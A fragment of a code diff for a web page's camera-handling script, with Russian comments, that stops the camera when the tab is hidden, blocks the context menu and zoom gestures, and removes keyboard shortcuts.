+function wait(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
 
-// авто-стоп камеры при уходе со страницы
+/* ================================================================
+   БЕЗОПАСНОСТЬ
+   ================================================================ */
+// если юзер свернул вкладку — глушим камеру
 document.addEventListener('visibilitychange', () => {
-  if (document.hidden && stream) {
-    stream.getTracks().forEach(t => t.stop());
-    stream = null;
-    video.srcObject = null;
-    cameraEl.classList.remove('active');
-    menuEl.classList.add('active');
+  if (document.hidden) {
+    stopStream();
+    hideProcessing();
+    busy = false;
   }
 });
 
-// блок скролла жестом "pinch"
+// блок контекстного меню и жестов зума
+document.addEventListener('contextmenu', e => e.preventDefault());
 document.addEventListener('gesturestart', e => e.preventDefault());
+document.addEventListener('dblclick', e => e.preventDefault());
 
-// кнопки громкости на телефоне не ловим, но защита от контекстного меню на долгое нажатие
-document.addEventListener('contextmenu', e => {
-  if (cameraEl.classList.contains('active')) e.preventDefault();
-});
-
-// хоткеи для десктопа
-document.addEventListener('keydown', (e) => {
-  if (!cameraEl.classList.contains('active')) return;
-  if (e.code === 'Space' || e.key === 'Enter') {
-    e.preventDefault();
-    capture();
-  }
-  if (e.key === 'Escape') {
-    closeCamera();
-  }
-});
-
-/* ================================================================
-   ПРЕДЗАГРУЗКА (прогрев камеры в фоне)
-   ================================================================ */
-// тихо проверяем поддержку API, без запроса доступа
-if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-  console.warn('getUserMedia не поддерживается');
-}
+// прогреваем камеру при первом касании (опционально, но может спалить)
+// оставим без прогрева — юзер нажмёт и сразу получит запрос
 </script>
 </body>
 </html>
